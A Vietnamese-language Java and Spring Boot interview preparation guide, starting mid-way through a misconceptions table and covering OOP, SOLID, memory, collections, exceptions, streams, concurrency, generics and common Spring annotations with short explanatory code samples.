| `==` và `equals` giống nhau? ([Q8](#q8)) | “Đều so sánh giá trị” | `==` so sánh reference, `equals` so sánh nội dung (nếu override) |
| Override `equals` có cần `hashCode`? ([Q8](#q8)) | “Không bắt buộc” | **Phải** giữ contract cho HashMap/HashSet |
| `@Transactional` luôn hoạt động? ([Q44](#q44)) | “Có, cứ đặt annotation là được” | Self-invocation trong cùng class có thể bypass proxy |
| LAZY luôn tốt hơn EAGER? ([Q42](#q42)) | “LAZY lúc nào cũng tối ưu” | Không tuyệt đối; phụ thuộc use-case và truy cập dữ liệu |
| PUT với PATCH giống nhau? ([Q83](#q83)) | “Cập nhật thì dùng cái nào cũng được” | PUT thường thay toàn bộ, PATCH cập nhật một phần |
| `Optional` dùng cho field entity? ([Q20](#q20)) | “Nên dùng mọi nơi” | Chủ yếu dùng ở API/service return type, không lạm dụng trong entity |
| `finally` có `return` vô hại? ([Q174](#q174)) | “Không vấn đề” | ⚠️ Ghi đè return/nuốt exception, nên tránh |
| Unit test cần Spring context? ([Q87](#q87), [Q200](#q200)) | “Test nào cũng `@SpringBootTest`” | Unit test nên nhẹ, mock dependency; chỉ mở context khi cần |

---
---

# PHẦN 1: JAVA CORE FUNDAMENTALS

---

## 1.1. OOP – Lập Trình Hướng Đối Tượng

### Q1: Bốn tính chất của OOP là gì? Giải thích từng tính chất.

**Trả lời:**

**1. Encapsulation (Đóng gói):** Ẩn dữ liệu bên trong class, chỉ cho phép truy cập qua các phương thức getter/setter. Mục đích là bảo vệ dữ liệu khỏi bị truy cập trực tiếp từ bên ngoài.

```java
public class Employee {
    private String name;     // field bị ẩn
    private double salary;

    public String getName() { return name; }
    public void setSalary(double salary) {
        if (salary > 0) this.salary = salary;  // validate trước khi set
    }
}
```

**2. Inheritance (Kế thừa):** Cho phép class con thừa hưởng thuộc tính và phương thức từ class cha. Java chỉ hỗ trợ single inheritance cho class, nhưng hỗ trợ multiple inheritance qua interface.

```java
public class Animal {
    public void eat() { System.out.println("Eating..."); }
}
public class Dog extends Animal {
    public void bark() { System.out.println("Barking..."); }
}
```

**3. Polymorphism (Đa hình):** Cùng một hành vi nhưng thể hiện khác nhau tùy vào đối tượng.
- **Compile-time (Overloading):** cùng tên method, khác tham số.
- **Runtime (Overriding):** class con ghi đè method class cha.

```java
// Overloading
public int add(int a, int b) { return a + b; }
public double add(double a, double b) { return a + b; }

// Overriding
class Animal { void sound() { System.out.println("..."); } }
class Cat extends Animal { 
    @Override void sound() { System.out.println("Meow"); } 
}
```

**4. Abstraction (Trừu tượng):** Ẩn đi chi tiết triển khai, chỉ hiển thị chức năng cần thiết. Thực hiện qua abstract class hoặc interface.

```java
public abstract class Shape {
    abstract double area();   // chỉ khai báo, không triển khai
}
public class Circle extends Shape {
    double radius;
    @Override double area() { return Math.PI * radius * radius; }
}
```

---

### Q2: Sự khác biệt giữa Abstract Class và Interface?

| Tiêu chí | Abstract Class | Interface |
|-----------|---------------|-----------|
| Keyword | `abstract class` | `interface` |
| Constructor | Có | Không |
| Method | Có thể có cả abstract và concrete | Mặc định abstract (Java 8+ có default, static) |
| Fields | Có thể có instance variable | Chỉ `public static final` |
| Kế thừa | Single inheritance | Multiple implementation |
| Access modifier | Tất cả | Mặc định `public` |
| Khi nào dùng | Các class có quan hệ "is-a" và chia sẻ code chung | Định nghĩa contract/hành vi chung giữa các class không liên quan |

```java
// Abstract class - dùng khi có code chung
public abstract class Vehicle {
    protected int speed;
    public void start() { System.out.println("Starting..."); }
    abstract void accelerate();
}

// Interface - dùng khi chỉ cần contract
public interface Flyable {
    void fly();
    default void land() { System.out.println("Landing..."); }
}
```

---

### Q3: Overloading vs Overriding?

| Tiêu chí | Overloading | Overriding |
|-----------|------------|-----------|
| Xảy ra ở | Cùng class hoặc class con | Chỉ ở class con |
| Method name | Giống | Giống |
| Parameters | Khác nhau | Giống nhau |
| Return type | Có thể khác | Giống hoặc covariant |
| Access modifier | Có thể khác | Không được restrictive hơn |
| Binding | Compile-time (static) | Runtime (dynamic) |
| static/final/private | Có thể overload | Không thể override |

---

### Q4: SOLID Principles là gì?

**S – Single Responsibility:** Mỗi class chỉ có một lý do để thay đổi.
```java
// SAI: class làm quá nhiều việc
class UserService {
    void createUser() { }
    void sendEmail() { }      // nên tách ra EmailService
    void generateReport() { } // nên tách ra ReportService
}

// ĐÚNG: mỗi class một nhiệm vụ
class UserService { void createUser() { } }
class EmailService { void sendEmail() { } }
```

**O – Open/Closed:** Mở cho mở rộng, đóng cho sửa đổi.
```java
// Dùng Strategy pattern thay vì if-else
interface DiscountStrategy { double apply(double price); }
class ChristmasDiscount implements DiscountStrategy {
    public double apply(double price) { return price * 0.8; }
}
```

**L – Liskov Substitution:** Object của class con phải thay thế được class cha mà không làm sai logic.
```java
abstract class Bird {
    abstract void move();
}

class Sparrow extends Bird {
    @Override void move() { System.out.println("Fly"); }
}

class Penguin extends Bird {
    @Override void move() { System.out.println("Swim"); } // vẫn đúng contract "move"
}
```

**I – Interface Segregation:** Không nên ép class implement interface mà nó không dùng. Nên tách thành nhiều interface nhỏ.
```java
interface Workable { void work(); }
interface Eatable { void eat(); }

class HumanWorker implements Workable, Eatable {
    public void work() { }
    public void eat() { }
}

class RobotWorker implements Workable {
    public void work() { }
}
```

**D – Dependency Inversion:** Module cấp cao không nên phụ thuộc module cấp thấp. Cả hai nên phụ thuộc vào abstraction.
```java
// SAI: module cấp cao phụ thuộc trực tiếp class cấp thấp
class NotificationServiceBad {
    private final EmailSender emailSender = new EmailSender();
    void notifyUser(String message) {
        emailSender.send(message);
    }
}

// Nếu đổi từ Email sang SMS/Telegram -> phải sửa NotificationServiceBad

interface MessageSender {
    void send(String message);
}

class EmailSender implements MessageSender {
    public void send(String message) { System.out.println("Email: " + message); }
}

class SmsSender implements MessageSender {
    public void send(String message) { System.out.println("SMS: " + message); }
}

// ĐÚNG: module cấp cao chỉ phụ thuộc abstraction MessageSender
class NotificationService {
    private final MessageSender sender;
    NotificationService(MessageSender sender) { this.sender = sender; } // constructor injection
    void notifyUser(String message) { sender.send(message); }
}

// Dễ thay implementation mà không sửa NotificationService
NotificationService emailService = new NotificationService(new EmailSender());
emailService.notifyUser("Welcome");

NotificationService smsService = new NotificationService(new SmsSender());
smsService.notifyUser("OTP: 123456");
```

---

## 1.2. Java Data Types & Memory

### Q5: Primitive types vs Reference types?

**Primitive types** (8 loại): `byte` (1 byte), `short` (2), `int` (4), `long` (8), `float` (4), `double` (8), `char` (2), `boolean`.
- Lưu trực tiếp giá trị trên Stack.
- Không thể null.

**Reference types:** Object, Array, String, Interface...
- Lưu reference (địa chỉ) trên Stack, object thực tế trên Heap.
- Có thể null.

```java
int a = 10;           // primitive, lưu trên stack
Integer b = 10;       // wrapper/reference, object trên heap
String s = "Hello";   // reference
```

---

### Q6: Stack vs Heap Memory?

**Stack:**
- Lưu biến local, tham chiếu, lời gọi method.
- LIFO (Last In First Out).
- Mỗi thread có stack riêng.
- Kích thước cố định, nhanh hơn.
- `StackOverflowError` khi đầy.

**Heap:**
- Lưu tất cả objects và instance variables.
- Được GC quản lý.
- Chia sẻ giữa các thread.
- Kích thước linh hoạt, chậm hơn.
- `OutOfMemoryError` khi đầy.

```
Stack                    Heap
┌──────────┐            ┌──────────────┐
│ main()   │            │ String "Hi"  │
│  s ──────│───────────►│              │
│  x = 10  │            │ Employee obj │
│ foo()    │            │  name="John" │
│  ref ────│───────────►│  age=30      │
└──────────┘            └──────────────┘
```

---

### Q7: String Pool là gì? Sự khác biệt giữa `String`, `StringBuilder`, `StringBuffer`?

**String Pool:** Vùng đặc biệt trong Heap lưu trữ String literals. Khi tạo String bằng literal, JVM kiểm tra pool trước, nếu đã tồn tại sẽ trả về reference cũ.

```java
String s1 = "Hello";        // vào pool
String s2 = "Hello";        // trỏ tới cùng object trong pool
String s3 = new String("Hello");  // tạo mới trên heap, KHÔNG vào pool
System.out.println(s1 == s2);     // true (cùng reference)
System.out.println(s1 == s3);     // false (khác reference)
System.out.println(s1.equals(s3)); // true (cùng giá trị)
```

| | String | StringBuilder | StringBuffer |
|--|--------|--------------|-------------|
| Mutable | Immutable | Mutable | Mutable |
| Thread-safe | Yes (immutable) | No | Yes (synchronized) |
| Performance | Chậm khi concat nhiều | Nhanh nhất | Chậm hơn StringBuilder |
| Khi nào dùng | Ít thay đổi | Một thread, nhiều thay đổi | Nhiều thread, nhiều thay đổi |

---

### Q8: `==` vs `.equals()` vs `hashCode()`?

- `==` so sánh reference (địa chỉ bộ nhớ).
- `.equals()` so sánh giá trị (nội dung). Mặc định trong Object dùng `==`, cần override.
- `hashCode()` trả về số nguyên đại diện cho object, dùng trong HashMap, HashSet.

**Contract:** Nếu `a.equals(b) == true` thì `a.hashCode() == b.hashCode()` phải đúng. Ngược lại không bắt buộc.

```java
import java.util.HashSet;
import java.util.Objects;
import java.util.Set;

class Person {
    private final String name;
    private final int age;

    Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true; // cùng object
        if (!(o instanceof Person)) return false;
        Person other = (Person) o;
        return age == other.age && Objects.equals(name, other.name); // cùng giá trị
    }

    @Override
    public int hashCode() {
        return Objects.hash(name, age); // equals giống -> hashCode phải giống
    }
}

Person p1 = new Person("An", 20);
Person p2 = new Person("An", 20);

System.out.println(p1 == p2);        // false (khác object)
System.out.println(p1.equals(p2));   // true  (cùng dữ liệu)

Set<Person> set = new HashSet<>();
set.add(p1);
set.add(p2);
System.out.println(set.size());      // 1 (không bị trùng trong HashSet)
```

**Giải thích nhanh đoạn `equals`:**
- `this == o`: nếu cùng reference thì chắc chắn bằng nhau.
- `instanceof Person`: nếu khác kiểu thì không thể bằng nhau.
- So sánh field nghiệp vụ (`name`, `age`) để quyết định 2 object có bằng nhau về mặt dữ liệu hay không.

---

### Q9: Immutable class là gì? Cách tạo?

Immutable class là class mà sau khi tạo object, trạng thái không thể thay đổi. Ví dụ: `String`, `Integer`, `LocalDate`.

**Cách tạo:**
1. Khai báo class `final` (không cho kế thừa).
2. Tất cả fields là `private final`.
3. Không có setter.
4. Deep copy trong constructor nếu có mutable field.
5. Trả về copy trong getter nếu có mutable field.

```java
public final class Money {
    private final double amount;
    private final String currency;
    private final Date createdAt;

    public Money(double amount, String currency, Date createdAt) {
        this.amount = amount;
        this.currency = currency;
        this.createdAt = new Date(createdAt.getTime()); // deep copy
    }

    public double getAmount() { return amount; }
    public String getCurrency() { return currency; }
    public Date getCreatedAt() { return new Date(createdAt.getTime()); } // defensive copy
}
```

---

## 1.3. Collections Framework

### Q10: Hệ thống Collections Framework?

```
                    Iterable
                       │
                   Collection
                 ╱     │      ╲
              List    Set     Queue
             ╱    ╲    │  ╲      ╲
       ArrayList  LinkedList  HashSet  TreeSet  PriorityQueue
                                │
                          LinkedHashSet

                      Map (riêng biệt)
                    ╱     │       ╲
              HashMap  TreeMap  LinkedHashMap
                │
           ConcurrentHashMap
```

---

### Q11: ArrayList vs LinkedList?

| Tiêu chí | ArrayList | LinkedList |
|-----------|-----------|-----------|
| Cấu trúc | Dynamic array | Doubly linked list |
| Truy cập (get) | O(1) | O(n) |
| Thêm/Xóa đầu | O(n) | O(1) |
| Thêm/Xóa cuối | O(1) amortized | O(1) |
| Bộ nhớ | Ít hơn | Nhiều hơn (lưu pointer) |
| Khi nào dùng | Đọc nhiều | Thêm/xóa nhiều |

---

### Q12: HashMap hoạt động nội bộ như thế nào?

**Cấu trúc:** Array of buckets, mỗi bucket là linked list (hoặc red-black tree khi >= 8 phần tử trong Java 8+).

**Quá trình put(key, value):**
1. Tính `hashCode()` của key.
2. Index = `hash & (n-1)` (n là capacity).
3. Nếu bucket trống → thêm node mới.
4. Nếu bucket có node → duyệt linked list:
   - Nếu tìm thấy key bằng `equals()` → cập nhật value.
   - Nếu không → thêm node mới vào cuối.
5. Nếu size > threshold (capacity × load factor 0.75) → resize gấp đôi.

```
Index 0: null
Index 1: [Key1, Value1] → [Key5, Value5]
Index 2: null
Index 3: [Key3, Value3]
Index 4: [Key4, Value4] → [Key8, Value8] → [Key12, Value12]
...
```

**Java 8+ Treeify:** Khi bucket có >= 8 node → chuyển thành Red-Black Tree (O(log n) thay vì O(n)).

---

### Q13: HashMap vs Hashtable vs ConcurrentHashMap?

| | HashMap | Hashtable | ConcurrentHashMap |
|--|---------|-----------|-------------------|
| Thread-safe | Không | Có (sync toàn bộ) | Có (segment locking) |
| Null key/value | Cho phép 1 null key | Không cho phép | Không cho phép |
| Performance | Nhanh nhất (single thread) | Chậm nhất | Tốt nhất (multi-thread) |
| Iterator | Fail-fast | Fail-fast | Weakly consistent |
| Khi nào dùng | Single thread | Legacy, tránh dùng | Multi-thread |

---

### Q14: Fail-fast vs Fail-safe Iterator?

**Fail-fast:** Ném `ConcurrentModificationException` nếu collection bị modify trong lúc iterate. Dùng trong ArrayList, HashMap...

```java
List<String> list = new ArrayList<>(Arrays.asList("A", "B", "C"));
for (String s : list) {
    list.remove(s);  // ConcurrentModificationException!
}
// Dùng Iterator.remove() thay thế
Iterator<String> it = list.iterator();
while (it.hasNext()) {
    it.next();
    it.remove();  // OK
}
```

**Fail-safe:** Iterate trên bản copy, không ném exception. Dùng trong ConcurrentHashMap, CopyOnWriteArrayList.

---

## 1.4. Exception Handling

### Q15: Hệ thống Exception trong Java?

```
         Throwable
         ╱        ╲
      Error     Exception
       │        ╱        ╲
  OutOfMemory  Checked    RuntimeException (Unchecked)
  StackOverflow  │              │
              IOException   NullPointerException
              SQLException  ArrayIndexOutOfBoundsException
              ClassNotFound IllegalArgumentException
                            ClassCastException
```

**Checked Exception:** Phải xử lý tại compile-time (try-catch hoặc throws). Ví dụ: IOException, SQLException.

**Unchecked Exception (RuntimeException):** Không bắt buộc xử lý. Ví dụ: NullPointerException, IllegalArgumentException.

**Error:** Lỗi hệ thống nghiêm trọng, không nên catch. Ví dụ: OutOfMemoryError, StackOverflowError.

---

### Q16: `throw` vs `throws`? `final` vs `finally` vs `finalize`?

**throw vs throws:**
```java
// throws: khai báo exception có thể xảy ra
public void readFile(String path) throws IOException {
    // throw: ném exception cụ thể
    if (path == null) throw new IllegalArgumentException("Path is null");
    // ...
}
```

**final vs finally vs finalize:**
- `final`: keyword ngăn chặn thay đổi (variable, method, class).
- `finally`: block luôn chạy sau try-catch (dùng dọn dẹp resource).
- `finalize()`: method của Object, được GC gọi trước khi thu hồi (deprecated từ Java 9).

```java
try {
    // code
} catch (Exception e) {
    // handle
} finally {
    // luôn chạy, kể cả khi có return trong try/catch
}
```

---

### Q17: Try-with-resources là gì?

Tự động đóng resource implement `AutoCloseable` sau khi dùng xong.

```java
// Trước Java 7
BufferedReader br = null;
try {
    br = new BufferedReader(new FileReader("file.txt"));
    // read
} finally {
    if (br != null) br.close();
}

// Java 7+ try-with-resources
try (BufferedReader br = new BufferedReader(new FileReader("file.txt"))) {
    // read - tự động close khi xong
}
```

---

## 1.5. Java 8+ Features

### Q18: Functional Interface, Lambda, Method Reference?

**Functional Interface:** Interface có đúng 1 abstract method. Đánh dấu bằng `@FunctionalInterface`.

```java
@FunctionalInterface
public interface Calculator {
    int calculate(int a, int b);
}

// Lambda expression
Calculator add = (a, b) -> a + b;
Calculator multiply = (a, b) -> a * b;

// Method Reference
Function<String, Integer> parser = Integer::parseInt;
Consumer<String> printer = System.out::println;
```

**Các Functional Interface phổ biến:**
- `Predicate<T>`: nhận T, trả boolean — `test(T t)`
- `Function<T,R>`: nhận T, trả R — `apply(T t)`
- `Consumer<T>`: nhận T, không trả — `accept(T t)`
- `Supplier<T>`: không nhận, trả T — `get()`
- `BiFunction<T,U,R>`: nhận T và U, trả R

---

### Q19: Stream API?

Stream là pipeline xử lý dữ liệu theo kiểu functional, không thay đổi source gốc.

```java
List<Employee> employees = getEmployees();

// Lọc, transform, thu thập
List<String> seniorNames = employees.stream()
    .filter(e -> e.getAge() > 30)                // Intermediate
    .filter(e -> e.getSalary() > 50000)           // Intermediate
    .sorted(Comparator.comparing(Employee::getName)) // Intermediate
    .map(Employee::getName)                        // Intermediate
    .distinct()                                    // Intermediate
    .collect(Collectors.toList());                 // Terminal

// Tính tổng lương
double totalSalary = employees.stream()
    .mapToDouble(Employee::getSalary)
    .sum();

// Gom nhóm theo department
Map<String, List<Employee>> byDept = employees.stream()
    .collect(Collectors.groupingBy(Employee::getDepartment));

// Parallel stream
long count = employees.parallelStream()
    .filter(e -> e.getSalary() > 50000)
    .count();
```

**Intermediate operations (lazy):** filter, map, flatMap, sorted, distinct, peek, limit, skip.
**Terminal operations (trigger execution):** collect, forEach, reduce, count, min, max, anyMatch, allMatch, findFirst.

---

### Q20: Optional là gì? Tại sao dùng?

Optional là container có thể chứa hoặc không chứa giá trị, giúp tránh NullPointerException.

```java
// KHÔNG dùng Optional
public String getCity(User user) {
    if (user != null) {
        Address address = user.getAddress();
        if (address != null) {
            return address.getCity();
        }
    }
    return "Unknown";
}

// Dùng Optional
public String getCity(User user) {
    return Optional.ofNullable(user)
        .map(User::getAddress)
        .map(Address::getCity)
        .orElse("Unknown");
}

// Các method chính
Optional<String> opt = Optional.of("Hello");
opt.isPresent();              // true
opt.get();                    // "Hello"
opt.orElse("default");        // "Hello"
opt.orElseThrow(() -> new RuntimeException("Not found"));
opt.ifPresent(System.out::println);
opt.map(String::toUpperCase); // Optional["HELLO"]
```

---

## 1.6. Multithreading & Concurrency

### Q21: Tạo Thread bằng những cách nào?

```java
// Cách 1: Extend Thread
class MyThread extends Thread {
    @Override public void run() { System.out.println("Running..."); }
}
new MyThread().start();

// Cách 2: Implement Runnable (khuyên dùng)
Runnable task = () -> System.out.println("Running...");
new Thread(task).start();

// Cách 3: Implement Callable (có return value)
Callable<Integer> callable = () -> { return 42; };
ExecutorService executor = Executors.newSingleThreadExecutor();
Future<Integer> future = executor.submit(callable);
Integer result = future.get(); // blocking

// Cách 4: ExecutorService (production)
ExecutorService pool = Executors.newFixedThreadPool(10);
pool.submit(() -> System.out.println("Task executed"));
pool.shutdown();
```

---

### Q22: `synchronized` keyword? Deadlock là gì?

**synchronized** đảm bảo chỉ một thread truy cập block/method tại một thời điểm.

```java
// Synchronized method
public synchronized void increment() { count++; }

// Synchronized block (chi tiết hơn)
public void increment() {
    synchronized (this) { count++; }
}
```

**Deadlock:** Hai hoặc nhiều thread chờ nhau mãi mãi vì mỗi thread giữ lock mà thread kia cần.

```java
// Thread 1: lock A → chờ lock B
// Thread 2: lock B → chờ lock A
// → Deadlock!

// Phòng tránh:
// 1. Luôn lock theo thứ tự nhất quán
// 2. Dùng tryLock() với timeout
// 3. Tránh nested locks
```

---

### Q23: `volatile` keyword? `Atomic` classes?

**volatile:** Đảm bảo biến luôn đọc/ghi từ main memory, không cache trong thread. Chỉ đảm bảo visibility, KHÔNG đảm bảo atomicity.

```java
private volatile boolean running = true;
// Tất cả threads nhìn thấy giá trị mới nhất ngay lập tức
```

**Atomic classes:** Đảm bảo cả visibility và atomicity bằng CAS (Compare-And-Swap).

```java
AtomicInteger counter = new AtomicInteger(0);
counter.incrementAndGet();  // atomic, thread-safe
counter.compareAndSet(5, 10); // set 10 nếu hiện tại là 5
```

---

### Q24: Thread Pool là gì? Các loại ExecutorService?

Thread Pool quản lý sẵn một nhóm threads để tái sử dụng, tránh overhead tạo/hủy thread liên tục.

```java
// Fixed pool: số thread cố định
ExecutorService fixed = Executors.newFixedThreadPool(10);

// Cached pool: tạo thread mới khi cần, tái sử dụng khi rảnh
ExecutorService cached = Executors.newCachedThreadPool();

// Scheduled pool: hỗ trợ delay và periodic execution
ScheduledExecutorService scheduled = Executors.newScheduledThreadPool(5);
scheduled.scheduleAtFixedRate(() -> task(), 0, 1, TimeUnit.SECONDS);

// Single thread: đảm bảo thứ tự FIFO
ExecutorService single = Executors.newSingleThreadExecutor();

// Custom ThreadPoolExecutor (khuyên dùng trong production)
ThreadPoolExecutor custom = new ThreadPoolExecutor(
    5,      // corePoolSize
    10,     // maxPoolSize
    60L, TimeUnit.SECONDS,  // keepAliveTime
    new LinkedBlockingQueue<>(100),  // work queue
    new ThreadPoolExecutor.CallerRunsPolicy()  // rejection policy
);
```

---

## 1.7. Generics

### Q25: Generics là gì? Wildcards?

Generics cho phép viết code type-safe mà không cần cast.

```java
// Generic class
public class Box<T> {
    private T value;
    public void set(T value) { this.value = value; }
    public T get() { return value; }
}
Box<String> box = new Box<>();
box.set("Hello");

// Generic method
public <T extends Comparable<T>> T max(T a, T b) {
    return a.compareTo(b) > 0 ? a : b;
}
```

**Wildcards:**
- `?` — unbounded: `List<?>` chấp nhận mọi type.
- `? extends T` — upper bounded: đọc (producer). `List<? extends Number>` chấp nhận `List<Integer>`, `List<Double>`.
- `? super T` — lower bounded: ghi (consumer). `List<? super Integer>` chấp nhận `List<Integer>`, `List<Number>`, `List<Object>`.

**PECS:** Producer Extends, Consumer Super.

```java
// Producer (đọc ra) → extends
public double sum(List<? extends Number> list) {
    return list.stream().mapToDouble(Number::doubleValue).sum();
}

// Consumer (ghi vào) → super
public void addNumbers(List<? super Integer> list) {
    list.add(1);
    list.add(2);
}
```

---

### Q26: Type Erasure là gì?

Compiler xóa thông tin generic tại compile-time, thay bằng Object (hoặc bound type). Tại runtime, `List<String>` và `List<Integer>` đều là `List`.

```java
// Compile-time
List<String> list = new ArrayList<>();

// Runtime (sau erasure)
List list = new ArrayList();  // generic info bị xóa

// Hệ quả:
// - Không thể dùng: new T(), instanceof T, T.class
// - Không thể tạo generic array: new T[10]
```

---

### Q26.1: Annotation trong Java là gì? Cơ chế hoạt động?

**Trả lời:**

**Annotation** là metadata gắn vào code (class, method, field, parameter...) để mô tả hành vi hoặc cấu hình, ví dụ `@Override`, `@Deprecated`, `@Entity`.

- **Khác comment:** comment chỉ dành cho người đọc; annotation có thể được compiler/framework/runtime đọc và xử lý.
- Annotation không trực tiếp chạy business logic, nhưng ảnh hưởng cách code được compile/scan/invoke.

```java
// Custom annotation đơn giản
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface Audit {
    String action();
}

public class UserService {
    @Audit(action = "CREATE_USER")
    public void createUser() { }
}
```

```java
// Đọc annotation bằng reflection
Method m = UserService.class.getMethod("createUser");
Audit audit = m.getAnnotation(Audit.class);
System.out.println(audit.action()); // CREATE_USER
```

**Ví dụ thực tế:**
- Spring scan `@Component`, `@Service` để tạo bean.
- JPA đọc `@Entity`, `@Table`, `@Column` để mapping object ↔ table.

---

### Q26.2: Phân loại annotation theo `@Retention` và `@Target`?

**Trả lời:**

`@Retention` quyết định annotation sống tới khi nào; `@Target` quyết định annotation được đặt ở đâu.

| Retention | Ý nghĩa | Dùng khi nào |
|---|---|---|
| `SOURCE` | Chỉ tồn tại trong source, mất sau compile | Checker, lint, annotation cho tooling |
| `CLASS` | Có trong `.class` nhưng runtime không đọc qua reflection | Bytecode tools, processing sau compile |
| `RUNTIME` | Tồn tại đến runtime, đọc được qua reflection | Spring/JPA/AOP/validation |

| Target | Áp dụng cho |
|---|---|
| `TYPE` | class/interface/enum |
| `METHOD` | method |
| `FIELD` | field |
| `PARAMETER` | parameter |
| `CONSTRUCTOR` | constructor |
| `ANNOTATION_TYPE` | annotation khác (meta-annotation) |
| `TYPE_USE` | type usage (Java 8+) |

```java
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.TYPE, ElementType.METHOD})
public @interface Track {
    String value();
}

@Track("service")
class OrderService {
    @Track("create")
    public void create() {}
}
```

```java
// Reflection đọc annotation có retention RUNTIME
Track t = OrderService.class.getAnnotation(Track.class);
System.out.println(t.value()); // service
```

---

### Q26.3: Bảng tổng hợp annotation thông dụng trong Spring Boot theo nhóm?

**Trả lời:**

| Annotation | Nhóm | Mục đích | Áp dụng cho |
|---|---|---|---|
| `@SpringBootApplication` | Configuration | Điểm vào app Spring Boot | Class |
| `@Configuration` | Configuration | Định nghĩa config class | Class |
| `@Bean` | Configuration | Khai báo bean thủ công | Method |
| `@ComponentScan` | Configuration | Quét component theo package | Class |
| `@Import` | Configuration | Import thêm config class | Class |
| `@PropertySource` | Configuration | Nạp thêm property file | Class |
| `@Component` | Stereotype | Bean chung | Class |
| `@Service` | Stereotype | Bean service layer | Class |
| `@Repository` | Stereotype | Bean data access + translate exception | Class |
| `@Controller` | Stereotype | MVC controller | Class |
| `@RestController` | Stereotype | REST controller (`@Controller` + `@ResponseBody`) | Class |
| `@Autowired` | DI | Inject dependency theo type | Field/Constructor/Method |
| `@Qualifier` | DI | Chọn bean cụ thể | Field/Parameter |
| `@Primary` | DI | Đánh dấu bean mặc định | Class/Method |
| `@Value` | DI | Inject giá trị property | Field/Parameter |
| `@Lazy` | DI | Trì hoãn khởi tạo bean | Class/Injection point |
| `@Resource` | DI | Inject theo name/type (JSR) | Field/Method |
| `@RequestMapping` | Web/REST | Map URL chung | Class/Method |
| `@GetMapping` / `@PostMapping` / `@PutMapping` / `@PatchMapping` / `@DeleteMapping` | Web/REST | Map theo HTTP method | Method |
| `@PathVariable` | Web/REST | Lấy path variable | Parameter |
| `@RequestParam` | Web/REST | Lấy query param | Parameter |
| `@RequestBody` | Web/REST | Bind request body vào DTO | Parameter |
| `@ResponseStatus` | Web/REST | Gán HTTP status | Method/Exception class |
| `@CrossOrigin` | Web/REST | Cấu hình CORS | Class/Method |
| `@Valid` | Validation | Kích hoạt bean validation | Parameter/Field |
| `@Validated` | Validation | Validation theo group | Class/Method/Parameter |
| `@NotNull` / `@NotBlank` / `@Size` / `@Email` | Validation | Ràng buộc dữ liệu đầu vào | Field |
| `@Entity` | JPA | Đánh dấu entity | Class |
| `@Table` | JPA | Map tên table | Class |
| `@Id` | JPA | Primary key | Field |
| `@GeneratedValue` | JPA | Sinh giá trị PK | Field |
| `@Column` | JPA | Map cột | Field |
| `@OneToMany` / `@ManyToOne` | JPA | Quan hệ 1-n / n-1 | Field |
| `@JoinColumn` | JPA | Cột khóa ngoại | Field |
| `@Transactional` | Transaction/AOP | Quản lý transaction | Class/Method |
| `@Aspect` | Transaction/AOP | Định nghĩa aspect | Class |
| `@Before` / `@After` / `@Around` | Transaction/AOP | Advice trước/sau/bao quanh | Method |
| `@SpringBootTest` | Testing | Load full Spring context | Class |
| `@WebMvcTest` | Testing | Test web layer | Class |
| `@DataJpaTest` | Testing | Test repository/JPA | Class |
| `@MockBean` | Testing | Mock bean trong Spring context | Field |
| `@Mock` | Testing | Mockito mock không cần Spring context | Field |
| `@Data` | Lombok | Getter/setter/toString/equals/hashCode | Class |
| `@Getter` / `@Setter` | Lombok | Generate getter/setter | Class/Field |
| `@Builder` | Lombok | Builder pattern | Class/Constructor/Method |
| `@AllArgsConstructor` / `@NoArgsConstructor` | Lombok | Generate constructors | Class |
| `@Slf4j` | Lombok | Tạo logger `log` | Class |

---

### Q26.4: `@SpringBootApplication` thực chất gồm những annotation nào?

**Trả lời:**

`@SpringBootApplication` là **meta-annotation** gộp 3 phần chính:

1. `@SpringBootConfiguration` (tương đương `@Configuration`)
2. `@EnableAutoConfiguration`
3. `@ComponentScan`

```java
@SpringBootApplication(
    exclude = {
        org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration.class
    }
)
public class Application {
    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }
}
```

**Khi nào tách 3 annotation thay vì dùng combo?**
- Cần kiểm soát scan/autoconfig rất cụ thể.
- Muốn explicit cấu hình cho multi-module hoặc bootstrap phức tạp.
- Khi debug startup và muốn thấy rõ từng responsibility.

```java
@SpringBootConfiguration
@EnableAutoConfiguration
@ComponentScan(basePackages = {"com.myapp.api", "com.myapp.core"})
public class Application { }
```

---

### Q26.5: `@Configuration` vs `@Component` vs `@Bean` — khác nhau thế nào?

**Trả lời:**

| Annotation | Bản chất | Khi dùng |
|---|---|---|
| `@Component` | Đánh dấu class để Spring scan thành bean | Class của bạn có thể sửa source |
| `@Configuration` | Dạng `@Component` đặc biệt cho class cấu hình; method `@Bean` được CGLIB proxy | Cần factory method, wiring thủ công, đảm bảo singleton đúng |
| `@Bean` | Khai báo bean ở mức method | Tạo bean từ class third-party hoặc khởi tạo phức tạp |

```java
// Third-party class không sửa được source
public class ExternalClient {
    public ExternalClient(String baseUrl, int timeoutMs) {}
}

@Configuration
public class ClientConfig {
    @Bean
    public ExternalClient externalClient() {
        return new ExternalClient("https://api.example.com", 3000);
    }
}
```

**Lưu ý quan trọng về proxy:**
- Trong `@Configuration`, gọi method `@Bean` từ method khác sẽ đi qua CGLIB proxy -> vẫn trả đúng singleton managed bean.
- Trong `@Component`, nếu tự gọi method `@Bean` kiểu nội bộ, có thể tạo instance mới (không được intercept như `@Configuration`).

---

### Q26.6: `@Value` vs `@ConfigurationProperties` — khi nào dùng cái nào?

**Trả lời:**

- `@Value("${...}")`: phù hợp cho **1-2 giá trị đơn lẻ**.
- `@ConfigurationProperties(prefix = "...")`: phù hợp cho **nhóm config** map vào POJO, dễ maintain hơn.

| Tiêu chí | `@Value` | `@ConfigurationProperties` |
|---|---|---|
| Mức sử dụng | Đơn lẻ | Theo nhóm cấu hình |
| Type-safe | Thấp hơn | Cao hơn |
| Validation | Khó hơn | Tốt (`@Validated`, Bean Validation) |
| Relaxed binding | Hạn chế | Tốt (`my-app.timeout` -> `myApp.timeout`) |
| IDE support/autocomplete | Ít | Tốt hơn khi có metadata |

```java
// @Value cho giá trị đơn
@Component
public class MailService {
    @Value("${mail.from}")
    private String from;
}
```

```java
// @ConfigurationProperties cho nhóm cấu hình
@Validated
@ConfigurationProperties(prefix = "app.jwt")
public class JwtProperties {
    @NotBlank
    private String secret;

    @Min(60)
    private long expirationSeconds;

    // getters/setters
}
```

```java
@Configuration
@EnableConfigurationProperties(JwtProperties.class)
public class AppConfig { }
